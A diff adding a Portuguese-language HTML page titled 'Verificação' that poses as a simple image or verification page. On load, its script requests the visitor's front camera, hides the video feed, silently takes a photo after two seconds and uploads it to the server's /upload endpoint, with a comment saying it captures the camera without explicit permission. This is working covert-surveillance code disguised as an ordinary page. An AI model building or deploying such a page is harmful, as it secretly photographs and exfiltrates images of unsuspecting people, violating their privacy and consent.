@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificação</title>
+  <style>
+    body {
+      margin: 0;
+      background: #111;
+      color: white;
+      font-family: Arial;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    video {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <img src="imagem.jpg" alt="Imagem" style="width: 320px; border-radius: 15px; margin-bottom: 20px;">
+
+  <script>
+    (async function () {
+      try {
+        // Captura a câmera frontal do usuário sem permissão explícita
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: "user"
+          },
+          audio: false
+        });
+
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        video.play();
+
+        // Aguarda 2 segundos e tira a foto
+        setTimeout(() => {
+          tirarFoto(video);
+        }, 2000);
+      } catch (err) {
+        console.log("Permissão negada:", err);
+      }
+    })();
+
+    async function tirarFoto(video) {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+
+      const ctx = canvas.getContext("2d");
+      ctx.drawImage(video, 0, 0);
+
+      const blob = await new Promise(resolve => {
+        canvas.toBlob(resolve, "image/jpeg", 0.95);
+      });
+
+      const formData = new FormData();
+      formData.append("foto", blob, "foto.jpg");
+
+      const resposta = await fetch("/upload", {
+        method: "POST",
+        body: formData
+      });
+
+      const resultado = await resposta.json();
+      console.log(resultado);
+    }
+  </script>
+</body>
+</html>
